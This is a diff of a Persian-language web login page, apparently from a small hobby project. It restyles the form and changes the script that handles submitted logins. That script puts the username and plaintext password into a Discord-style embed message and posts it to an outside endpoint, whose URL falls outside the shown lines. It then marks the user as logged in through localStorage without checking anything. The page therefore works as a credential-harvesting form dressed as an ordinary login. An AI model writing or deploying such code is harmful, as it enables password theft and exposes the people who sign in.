@@ -6,71 +6,103 @@
   <title>ورود</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #0e0e0e;
+      font-family: 'Rubik', sans-serif;
+      background: linear-gradient(135deg, #0e0e0e, #1a1a1a, #2a2a2a);
       color: #fff;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
+      direction: rtl;
     }
+
     .form-container {
-      background: #1a1a1a;
-      padding: 2rem;
-      border-radius: 12px;
-      width: 320px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      background: rgba(26, 26, 26, 0.9);
+      padding: 2.5rem;
+      border-radius: 16px;
+      width: 360px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(12px);
+      animation: fadeIn 1s ease;
     }
+
     h2 {
       text-align: center;
       margin-bottom: 1.5rem;
       color: #8a2be2;
+      font-size: 1.6rem;
     }
+
     .form-group {
-      margin-bottom: 1rem;
+      margin-bottom: 1.2rem;
     }
+
     label {
       display: block;
       margin-bottom: 0.5rem;
+      font-weight: bold;
+      font-size: 0.9rem;
     }
+
     input {
       width: 100%;
-      padding: 0.7rem;
+      padding: 0.8rem;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       background: #2a2a2a;
       color: #fff;
+      font-size: 0.95rem;
+      transition: 0.3s;
     }
+
+    input:focus {
+      outline: none;
+      background: #333;
+      box-shadow: 0 0 0 2px #8a2be2;
+    }
+
     .btn {
       width: 100%;
-      padding: 0.8rem;
-      background: #8a2be2;
+      padding: 0.9rem;
+      background: linear-gradient(45deg, #8a2be2, #6a1db7);
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       color: #fff;
       font-size: 1rem;
+      font-weight: bold;
       cursor: pointer;
       transition: 0.3s;
     }
+
     .btn:hover {
-      background: #6a1db7;
+      background: linear-gradient(45deg, #6a1db7, #8a2be2);
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(138, 43, 226, 0.5);
     }
+
     .link {
       display: block;
       text-align: center;
-      margin-top: 1rem;
+      margin-top: 1.5rem;
       color: #aaa;
       text-decoration: none;
+      transition: 0.3s;
     }
+
     .link:hover {
       color: #fff;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
 <body>
   <div class="form-container">
-    <h2>ورود</h2>
+    <h2>🔐 ورود</h2>
     <form id="loginForm">
       <div class="form-group">
         <label for="loginUsername">نام کاربری</label>
@@ -80,7 +112,7 @@
         <label for="loginPassword">رمز عبور</label>
         <input type="password" id="loginPassword" required>
       </div>
-      <button type="submit" class="btn">ورود</button>
+      <button type="submit" class="btn">🚀 ورود</button>
     </form>
     <a href="register.html" class="link">حساب ندارید؟ ثبت نام کنید</a>
   </div>
@@ -95,7 +127,18 @@
       const password = document.getElementById("loginPassword").value;
 
       const payload = {
-        content: `🔐 **ورود به حساب**\n👤 یوزرنیم: ${username}\n🔑 پسورد: ${password}`
+        embeds: [
+          {
+            title: "🔐 ورود به حساب",
+            color: 10181046,
+            fields: [
+              { name: "👤 یوزرنیم", value: username, inline: false },
+              { name: "🔑 پسورد", value: password, inline: false }
+            ],
+            footer: { text: "Supernatural Login System" },
+            timestamp: new Date()
+          }
+        ]
       };
 
       try {
@@ -105,10 +148,7 @@
           body: JSON.stringify(payload)
         });
 
-        // ذخیره وضعیت لاگین
         localStorage.setItem("isLoggedIn", "true");
-
-        // ریدایرکت به صفحه اصلی
         window.location.href = "index.html";
       } catch (err) {
         alert("❌ خطا در ورود، دوباره تلاش کنید.");
